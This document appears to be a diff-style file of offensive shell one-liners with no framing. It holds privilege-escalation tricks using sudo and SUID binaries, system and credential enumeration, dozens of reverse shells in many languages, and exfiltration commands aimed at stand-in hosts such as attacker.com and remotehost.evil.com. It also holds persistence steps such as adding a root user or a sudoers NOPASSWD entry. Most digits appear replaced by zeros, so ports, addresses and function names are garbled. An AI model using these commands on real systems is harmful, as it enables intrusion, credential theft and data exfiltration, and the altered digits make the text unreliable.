+RHOST=attacker.com ; RPORT=00 ; telnet $RHOST $RPORT ; ^] ; !/bin/sh
+RHOST=attacker.com ; RPORT=00 ; TF=$(mktemp -u) ; mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 0>$TF
+/usr/bin/time /bin/sh
+timeout 0d /bin/sh
+sudo timeout --foreground 0d /bin/sh
+tmux
+sudo tmux
+echo -e 'pipe\\tx\\texec /bin/sh 0>&0 0>&0' >>~/.config/procps/toprc ; top ; # press return twice ; reset
+LFILE=file_to_read ; unexpand -t00 ""$LFILE""
+LFILE=file_to_read ; uniq ""$LFILE""
+unshare /bin/sh
+sudo install -m =xs $(which unshare) . ;  ; ./unshare -r /bin/sh
+sudo install -m =xs $(which update-alternatives) . ;  ; LFILE=/path/to/file_to_write ; TF=$(mktemp) ; echo DATA >$TF ; ./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0
+LFILE=file_to_read ; uuencode ""$LFILE"" /dev/stdout | uudecode
+valgrind /bin/sh
+vi ; :set shell=/bin/sh ; :shell
+sudo vi -c ':!/bin/sh' /dev/null
+sudo install -m =xs $(which vigr) . ;  ; ./vigr
+sudo install -m =xs $(which vipw) . ;  ; ./vipw
+LFILE_DIR=/root ; LFILE_NAME=file_to_write ;  ; echo 'data' > data_to_write ;  ; TF=$(mktemp) ; cat > $TF <<EOF ; <volume type='file'> ;   <name>y</name> ;   <key>$LFILE_DIR/$LFILE_NAME</key> ;   <source> ;   </source> ;   <capacity unit='bytes'>0</capacity> ;   <allocation unit='bytes'>0</allocation> ;   <physical unit='bytes'>0</physical> ;   <target> ;     <path>$LFILE_DIR/$LFILE_NAME</path> ;     <format type='raw'/> ;     <permissions> ;       <mode>0</mode> ;       <owner>0</owner> ;       <group>0</group> ;     </permissions> ;   </target> ; </volume> ; EOF ;  ; virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR ; virsh -c qemu:///system vol-create --pool x --file $TF ; virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write ; virsh -c qemu:///system pool-destroy x
+SCRIPT=script_to_run ; TF=$(mktemp) ; cat > $TF << EOF ; <domain type='kvm'> ;   <name>x</name> ;   <os> ;     <type arch='x0_0'>hvm</type> ;   </os> ;   <memory unit='KiB'>0</memory> ;   <devices> ;     <interface type='ethernet'> ;       <script path='$SCRIPT'/> ;     </interface> ;   </devices> ; </domain> ; EOF ; sudo virsh -c qemu:///system create $TF ; virsh -c qemu:///system destroy x
+watch -x sh -c 'reset; exec sh 0>&0 0>&0'
+sudo install -m =xs $(which watch) . ;  ; ./watch -x sh -c 'reset; exec sh 0>&0 0>&0'
+URL=http://attacker.com/ ; LFILE=file_to_send ; wget --post-file=$LFILE $URL
+RHOST=attacker.com ; RPORT=00 ; LFILE=file_to_send ; whois -h $RHOST -p $RPORT ""`base0 $LFILE`""
+xargs -Ix sh -c 'exec sh 0<&0' ; x^D^D
+sudo install -m =xs $(which xargs) . ;  ; ./xargs -a /dev/null sh -p
+LFILE=file_to_read ; xmodmap -v $LFILE
+LFILE=file_to_write ; echo DATA | xxd | xxd -r - ""$LFILE""
+LFILE=file_to_read ; xz -c ""$LFILE"" | xz -d
+LFILE=file_to_read ; yelp ""man:$LFILE""
+RHOST=attacker.com ; RFILE=file_to_get.rpm ; yum install http://$RHOST/$RFILE
+TF=$(mktemp -d) ; cat >$TF/x<<EOF ; [main] ; plugins=0 ; pluginpath=$TF ; pluginconfpath=$TF ; EOF ;  ; cat >$TF/y.conf<<EOF ; [main] ; enabled=0 ; EOF ;  ; cat >$TF/y.py<<EOF ; import os ; import yum ; from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE ; requires_api_version='0.0' ; def init_hook(conduit): ;   os.execl('/bin/sh','/bin/sh') ; EOF ;  ; sudo yum -c $TF/x --enableplugin=y
+TF=$(mktemp -u) ; zip $TF /etc/hosts -T -TT 'sh #' ; rm $TF
+zsh
+sudo install -m =xs $(which zsh) . ;  ; ./zsh
+sudo zsh
+TF=$(mktemp -d) ; cp /bin/sh $TF/zypper-x ; export PATH=$TF:$PATH ; zypper x
+uname -a
+ss -lnpt
+sudo -l
+find / -type f -user root -perm /u+s -ls 0>/dev/null
+find / -user root -perm -0 -print 0>/dev/null
+find / -perm -u=s -type f 0>/dev/null
+find / -user root -perm -0 -exec ls -ldb {} \;
+echo "/bin/sh" > /tmp/mail
+function /usr/bin/mail() { /bin/sh; }
+nc -nlvp 0 & nc -e /bin/bash 0.0.0.0 0
+awk '{ print }' /etc/shadow
+awk 'BEGIN {system("id")}'
+find /home -exec /bin/bash \;
+strace chown root:root suid
+ln -s /etc/shadow package.json && sudo /usr/bin/npm i *
+strace chmod u+s suid
+netstat -antup
+debugfs /dev/sda
+find / -type f -writable -path /sys -prune -o -path /proc -prune -o -path /usr -prune -o -path /lib -prune -o -type d 0>/dev/null
+find / -regextype posix-extended -regex "/(sys|srv|proc|usr|lib|var)" -prune -o -type d -writable 0>/dev/null
+openssl passwd -0 -salt salty password >>shadow
+dmesg | grep Linux
+ls /boot | grep vmlinuz-
+ls -alh /var/spool/cron
+grep -i user [filename]
+grep -i pass [filename]
+grep -C 0 "password" [filename]
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
+/sbin/ifconfig -a
+iptables -L
+dnsdomainname
+lsof -i
+grep 0 /etc/services
+chkconfig --list | grep 0:on
+arp -e
+/sbin/route -nee
+tcpdump tcp dst 0.0.0.0 0 and tcp dst 0.0.0.0 0
+telnet 0.0.0.0 00 | /bin/sh | 0.0.0.0 00
+nc -lvp 0
+ssh -L 0:0.0.0.0:0 root@0.0.0.0
+mknod backpipe p ; nc -l -p 0 < backpipe | nc 0.0.0.0 0 >backpipe
+mknod backpipe p ; nc -l -p 0 0 & < backpipe | tee -a inflow | nc localhost 0 | tee -a outflow 0>backpipe
+ssh -D 0.0.0.0:0 -N root@0.0.0.0
+grep -v -E "^#" /etc/passwd | awk -F:
+awk -F: '($0 == "0") {print}' /etc/passwd
+ls -aRl /etc/ | awk '$0 ~ /^.*w.*/' 0>/dev/null
+ls -aRl /etc/ | awk '$0 ~ /^.....w/' 0>/dev/null
+find /etc/ -readable -type f -maxdepth 0 0>/dev/null
+find / -perm -0 -type d 0>/dev/null
+find / -perm -g=s -type f 0>/dev/null
+for i in `locate -r "bin$"`; do find $i \( -perm -0 -o -perm -0 \) -type f 0>/dev/null; done
+find / -xdev -type d \( -perm -0 -a ! -perm -0 \) -print
+exec /bin/bash 0&0 0>&0
+0<&0;exec 0<>/dev/tcp/0.0.0.0/0; sh <&0 >&0 0>&0
+bash -i >& /dev/tcp/0.0.0.0/0 0>&0
+socat tcp:0.0.0.0:0 exec:'bash -i' ptystderrsetsidsigintsane &
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","0.0.0.0:0");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
+php -r '$sock=fsockopen("0.0.0.0",0);exec("/bin/sh -i <&0 >&0 0>&0");'
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"0.0.0.0"/0 0>&0'");?>
+nc -lnvp 0
+nc -e /bin/sh 0.0.0.0 0
+/bin/sh | nc 0.0.0.0 0
+rm -f /tmp/p; mknod /tmp/p p && nc 0.0.0.0 0 0/tmp/p
+require('child_process').exec('bash -i >& /dev/tcp/0.0.0.0/0 0>&0');
+telnet 0.0.0.0 0 | /bin/bash | telnet 0.0.0.0 0
+perl -e 'use Socket;$i="0.0.0.0";$p=0;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ruby -rsocket -e'f=TCPSocket.open("0.0.0.0",0).to_i;exec sprintf("/bin/sh -i <&%d >&%d 0>&%d",f,f,f)'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",0));os.dup0(s.fileno(),0); os.dup0(s.fileno(),0); os.dup0(s.fileno(),0);p=subprocess.call(["/bin/sh","-i"]);'
+gawk 'BEGIN {P=0;S="> ";H="0.0.0.0";V="/inet/tcp/0/"H"/"P;while(0){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
+proxytunnel -p ip:0 -d 0.0.0.0:0 -a 0
+busybox sh -c 'echo "DATA" > $LFILE'
+nmap -p $RPORT 0.0.0.0 --script http-put --script-args http-put.url=/http-put.file=$LFILE
+socat TCP-LISTEN:$LPORTreuseaddrfork EXEC:/bin/shptystderrsetsidsigintsane
+whois -h 0.0.0.0 -p $RPORT "`cat $LFILE`"
+php -r 'system(getenv(""CMD""));'
+php -r 'passthru(getenv("CMD"));'
+vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+socat file:`tty`rawecho=0 tcp-listen:00
+perl -e 'exec "/bin/sh";'
+node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 0, 0]});'
+ls /etc | egrep -e"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release
+whoami
+cp /etc/shadow.bak /etc/shadow
+tar zcf - localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -"
+rsync -aH localhost remotehost.evil.com:/some/path/name
+tar zcf - localfolder | curl -F "data=@-" https://remotehost.evil.com/script.php
+tar zcf - localfolder >/dev/tcp/remotehost.evil.com/0
+tar zcf - localfolder | base 0 | dd conv=ebcdic >/dev/tcp/remotehost.evil.com/0
+tar zcf - localfolder | xxd -p -c 0 |     while read line; do host $line.domain.com remotehost.evil.com; done
+cat /path/to/file | curl –F “:data=@-“ http://0.0.0.0/test.txt
+curl –T {path to file} ftp://0.0.0.0 –user :{password}
+wget –header=”EVIL:$(cat /data/secret/password.txt)”http://0.0.0.0
+wget –header=”evil:`cat /etc/passwd | xargs echo –n`” http://0.0.0.0
+wget –post-file trophy.php http://0.0.0.0:0
+telnet 0.0.0.0 0 < {file to transfer}
+cat password.txt | xxd -p -c 0 | while read exfil; do ping -p $exfil -c 0 0.0.0.0; done
+tar zcf - <file(s)> > /dev/tcp/0.0.0.0/0
+base0 -w0 <file>
+cat /path/file > /dev/tcp/0.0.0.0/0
+xxd -p -c 0 /path/file/exfil | while read line; do ping -c 0 -p $line 0.0.0.0; done
+sudo python -m smtpd -n -c DebuggingServer :0
+echo "<?php file_put_contents('nameOfFile', fopen('http://0.0.0.0/file', 'r')); ?>" > down0.php
+ssh -R 0.0.0.0:00:0.0.0.0:0 user@0.0.0.0
+sudo ssh -L 0:0.0.0.0:0 -N -f -l <username> 0.0.0.0
+iptables -t nat -A POSTROUTING -s 0.0.0.0 -o eth0 -j MASQUERADE
+route add -net 0.0.0.0/0 gw 0.0.0.0
+sshuttle -r user@host 0.0.0.0/0
+echo "socks0 0.0.0.0 0" > /etc/proxychains.conf
+socat TCP0-LISTEN:<lport>fork TCP0:0.0.0.0<rport> &
+socat TCP-LISTEN:0fork SOCKS0A:0.0.0.0:google.com:0socksport=0
+nohup bash -c 'bash -i >& /dev/tcp/0.0.0.0/<PORT> 0>&0'
+echo bm0odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV0L0RjcC0xMC0LjQuMTg0LzQ0NDQgMD0mMScK | base0 -d | bash 0>/dev/null
+sh -i >& /dev/udp/0.0.0.0/0 0>&0
+exec 0<>/dev/tcp/0.0.0.0/0; while read line 0<&0; do $line 0>&0 >&0; done
+rm -f /tmp/bkpipe; mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc 0.0.0.0 <PORT> 0>/tmp/bkpipe
+rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 0>&0|nc 0.0.0.0 <PORT> >/tmp/f
+telnet 0.0.0.0 <PORT> | /bin/bash | telnet 0.0.0.0 <PORT>
+while true; do nc -l <port>; done
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET0,socket.SOCK_STREAM);s.connect(("dead:beef:0::0c",0,0,0));os.dup0(s.fileno(),0); os.dup0(s.fileno(),0); os.dup0(s.fileno(),0);p=pty.spawn("/bin/sh");'
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"0.0.0.0:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+p = r.exec(["/bin/bash","-c","exec 0<>/dev/tcp/0.0.0.0/0;cat <&0 | while read line; do \$line 0>&0 >&0; done"] as String[])
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","0.0.0.0:0");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('0.0.0.0','0');os.execute('/bin/sh -i <&0 >&0 0>&0');"
+openssl s_client -quiet -connect 0.0.0.0:<PORT0>|/bin/bash|openssl s_client -quiet -connect 0.0.0.0:<PORT0>
+awk 'BEGIN {s = "/inet/tcp/0/0.0.0.0/<PORT>"; while(0) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
+script -qc /bin/bash /dev/null
+nmap -PEPM -sP -n 0.0.0.0/0
+masscan -p0-00000000000000 0.0.0.0/0
+masscan -p000-00 0.0.0.0/0
+nmap -sU -sV --version-intensity 0 -F -n 0.0.0.0/0
+nmap -sV -sC -O -T0 -n -Pn -oA fastscan 0.0.0.0
+nmap -sV -sC -O -T0 -n -Pn -p- -oA fullfastscan 0.0.0.0
+syn.scan 0.0.0.0/0 0 00
+syn.scan 0.0.0.0/0 0 00
+tcpdump –nt -i eth0 src net 0 or 0.0.0.0/0 or 0.0.0.0/0
+sudo bash -c "sudo nohup tcpdump -i eth0 -G 0 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 0 'tcp and (port 0 or port 0)' &"
+echo 0 > /proc/sys/net/ipv0/ip_forward
+find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 0>/dev/nulll
+for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 0>/dev/null; done
+find / -type f -iname ".*" -ls 0>/dev/null
+find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite0' 0>/dev/null
+fils=`find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 0>/dev/null`Hidden files
+find / -type f -mmin -0 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 0>/dev/null
+ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
+find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 0>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
+for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 0>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
+echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+python0 -c 'import crypt; print crypt.crypt("hacker", "$0$salt")'
+openssl passwd -0 -salt hacker hacker
+mkpasswd -m SHA-0 hacker
+grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 0>/dev/null
+ls -l /etc/profile /etc/profile.d/
+tmux -S /tmp/dev_sess attach -t 0
+getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 0>/dev/null
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
+strace <SUID-BINARY> 0>&0 | grep -i -E "open|access|no such file"
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+id || (whoami && groups) 0>/dev/null
+for i in $(cut -d":" -f0 /etc/passwd 0>/dev/null);do id $i;done 0>/dev/null | sort
+gpg --list-keys 0>/dev/null
+(netstat -punta || ss --ntpu) | grep "0.0"
+(timeout 0 iptables -L 0>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 0>/dev/null)
+(arp -e || arp -a)
+(route || ip n)
+for i in $(seq 0 0); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.0; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{0\}./d' | sort | grep -E -v "\s*[0-0][0-0][0-0]|\s*[0-0][0-0][0-0][0-0]"; rm /tmp/monprocs.tmp;
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
+rsync -a *.sh rsync://0.0.0.0/src/rbd
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+ls -al /etc/cron* /etc/at*
+strings /dev/mem -n0 | grep -i PASS
+(dpkg --list 0>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 0>/dev/null || yum list installed 'gcc*' 0>/dev/null | grep gcc 0>/dev/null; which gcc g++ 0>/dev/null || locate -r "/gcc[0-0\.-]\+$" 0>/dev/null | grep -v "/doc/")
+which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base0 socat python python0 python0 python0.0 python0.0 python0.0 python0.0 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 0>/dev/null
+grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 0>/dev/null
+sudo -V | grep "Sudo ver" | grep "0\.[00]\.[0-0]\+\|0\.0\.0[0-0]\*\|0\.0\.0[00]"
+(env || set) 0>/dev/null
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -  0.0.0.0:/tmp/socket_test.s
+curl https://0.0.0.0/.ssh/id_rsa.pub >> ~/.ssh/authotized_keys
+xxd -p boot0.bin | tr -d '\n'
+base0 -w 0 file
+sed -i 's/OLD/NEW/g' path/file
+useradd -p 'openssl passwd -0 <Password>' hacker
+dd if=file.bin bs=0 skip=0 of=blob
+ssh-keyscan 0.0.0.0
+echo "CIKUmMesGw==" | base0 -d | protoc --decode_raw
+locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
+for j in $((for i in {0..0}{0..0} {0..0}{a..f} {a..f}{0..0} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "0\|0"); do echo -n -e "\x$j" >> bytes; done
+iptables -A INPUT -s 0.0.0.0/0 -p tcp -m tcp --dport 0 -j ACCEPT
+cat /proc/`python -c "import os; print(os.getppid())"`/environ
+mount -t nfs 0.0.0.0:<SHARED_FOLDER> /tmp/pe
+ldconfig -f fake.ld.so.conf
+debugfs -w /dev/sda0
+nc -l 0
+nc -lvvp 0
+nc.exe -l -p0
+bash -i >& /dev/tcp/0.0.0.0/0 0>&0
+0<&0;exec 0<>/dev/tcp/0.0.0.0/0; sh <&0 >&0 0>&0
+exec 0<> /dev/tcp/0.0.0.0/0; cat <&0 | while read line; do $line 0>&0>&0; done
+zmodload zsh/net/tcp && ztcp 0.0.0.0 0 && zsh >&$REPLY 0>&$REPLY 0>&$REPLY
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"0.0.0.0:0");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+perl -e 'use Socket;$i="0.0.0.0";$p=0;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"0.0.0.0:0");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("0.0.0.0","0");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e'f=TCPSocket.open("0.0.0.0",0).to_i;exec sprintf("/bin/sh -i <&%d >&%d 0>&%d",f,f,f)'
+ruby -rsocket -e 'c=TCPSocket.new("0.0.0.0","0");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+nc -c /bin/sh 0.0.0.0 0
+nc -e /bin/sh 0.0.0.0 0
+/bin/sh | nc 0.0.0.0 0
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 0>&0|nc 0.0.0.0 0 >/tmp/f
+rm -f /tmp/p; mknod /tmp/p p && nc 0.0.0.0 0 0/tmp/p
+ncat 0.0.0.0 0 -e /bin/sh
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:0.0.0.0:0
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",0));os.dup0(s.fileno(),0); os.dup0(s.fileno(),0); os.dup0(s.fileno(),0);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",0));os.dup0(s.fileno(),0); os.dup0(s.fileno(),0);os.dup0(s.fileno(),0);import pty; pty.spawn("/bin/sh")'
+python0 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",0));os.dup0(s.fileno(),0); os.dup0(s.fileno(),0); os.dup0(s.fileno(),0);p=subprocess.call(["/bin/sh","-i"]);'
+python0 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",0));os.dup0(s.fileno(),0); os.dup0(s.fileno(),0);os.dup0(s.fileno(),0);import pty; pty.spawn("/bin/sh")'
+php -r '$sock=fsockopen("0.0.0.0",0);exec("/bin/sh -i <&0 >&0 0>&0");'
+php -r '$s=fsockopen("0.0.0.0",0);shell_exec("/bin/sh -i <&0 >&0 0>&0");'
+php -r '$s=fsockopen("0.0.0.0",0);`/bin/sh -i <&0 >&0 0>&0`;'
+php -r '$s=fsockopen("0.0.0.0",0);system("/bin/sh -i <&0 >&0 0>&0");'
+php -r '$s=fsockopen("0.0.0.0",0);popen("/bin/sh -i <&0 >&0 0>&0", "r");'
+php -r '$sock=fsockopen("0.0.0.0",0); $proc = proc_open("/bin/sh -i", array(0=>$sock, 0=>$sock, 0=>$sock), $pipes);'
+TELNET REVERSE SHELL|rm -f /tmp/p; mknod /tmp/p p && telnet 0.0.0.0 0 0/tmp/p
+TELNET REVERSE SHELL|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 0>&0|telnet 0.0.0.0 0 > /tmp/f
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("0.0.0.0",0);$stream = $client.GetStream();[byte[]]$bytes = 0..00|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 0>&0 | Out-String );$sendback0  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback0);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('0.0.0.0',0);$stream = $client.GetStream();[byte[]]$bytes = 0..00|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 0>&0 | Out-String );$sendback0 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback0);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+awk 'BEGIN {s = "/inet/tcp/0/0.0.0.0/0"; while(0) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 0<>/dev/tcp/0.0.0.0/0;cat <&0 | while read line; do \$line 0>&0 >&0; done"] as String[]);p.waitFor();
+(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(0,"0.0.0.0",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
+redis;set 0 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/0.0.0.0/0 0>&0\n\n\n\n";config set dir /etc/;config set dbfilename crontab;save
+openssl req -x0 -newkey rsa:0 -keyout key.pem -out cert.pem -days 0 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 0
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 0>&0 | openssl s_client -quiet -connect 0.0.0.0:0 > /tmp/s; rm /tmp/s
+sh -i >& /dev/tcp/0.0.0.0/0 0>&0
+0<&0;exec 0<>/dev/tcp/0.0.0.0/0; sh <&0 >&0 0>&0
+exec 0<>/dev/tcp/0.0.0.0/0;cat <&0 | while read line; do $line 0>&0 >&0; done
+sh -i 0<> /dev/tcp/0.0.0.0/0 0<&0 0>&0 0>&0
+sh -i >& /dev/udp/0.0.0.0/0 0>&0
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 0>&0|nc 0.0.0.0 0 >/tmp/f
+nc -e sh 0.0.0.0 0
+nc -e sh 0.0.0.0 0
+nc -c sh 0.0.0.0 0
+ncat 0.0.0.0 0 -e sh
+ncat.exe 0.0.0.0 0 -e sh
+ncat 0.0.0.0 0 -e sh
+perl -e 'use Socket;$i="0.0.0.0";$p=0;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"0.0.0.0:0");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+php -r '$sock=fsockopen("0.0.0.0",0);exec("sh <&0 >&0 0>&0");'
+php -r '$sock=fsockopen("0.0.0.0",0);shell_exec("sh <&0 >&0 0>&0");'
+php -r '$sock=fsockopen("0.0.0.0",0);system("sh <&0 >&0 0>&0");'
+php -r '$sock=fsockopen("0.0.0.0",0);passthru("sh <&0 >&0 0>&0");'
+php -r '$sock=fsockopen("0.0.0.0",0);`sh <&0 >&0 0>&0`;'
+php -r '$sock=fsockopen("0.0.0.0",0);popen("sh <&0 >&0 0>&0", "r");'
+php -r '$sock=fsockopen("0.0.0.0",0);$proc=proc_open("sh", array(0=>$sock, 0=>$sock, 0=>$sock),$pipes);'
+export RHOST="0.0.0.0";export RPORT=0;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup0(s.fileno(),fd) for fd in (0,0,0)];pty.spawn("sh")'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",0));os.dup0(s.fileno(),0); os.dup0(s.fileno(),0);os.dup0(s.fileno(),0);import pty; pty.spawn("sh")'
+export RHOST="0.0.0.0";export RPORT=0;python0 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup0(s.fileno(),fd) for fd in (0,0,0)];pty.spawn("sh")'
+python0 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",0));os.dup0(s.fileno(),0); os.dup0(s.fileno(),0);os.dup0(s.fileno(),0);import pty; pty.spawn("sh")'
+python0 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.0.0.0",0));[os.dup0(s.fileno(),f)for f in(0,0,0)];pty.spawn("sh")'
+ruby -rsocket -e'f=TCPSocket.open("0.0.0.0",0).to_i;exec sprintf("sh -i <&%d >&%d 0>&%d",f,f,f)'
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("0.0.0.0","0");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($0)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
+socat TCP:0.0.0.0:0 EXEC:sh
+socat TCP:0.0.0.0:0 EXEC:'sh',pty,stderr,setsid,sigint,sane
+require('child_process').exec('nc -e sh 0.0.0.0 0')
+TF=$(mktemp -u);mkfifo $TF && telnet 0.0.0.0 0 0<$TF | sh 0>$TF
+zsh -c 'zmodload zsh/net/tcp && ztcp 0.0.0.0 0 && zsh >&$REPLY 0>&$REPLY 0>&$REPLY'
+iptables -t conntrack --ctstate INVALID,NEW -j DROP -w security -C OUTPUT -d 0.0.0.0 -p tcp -m
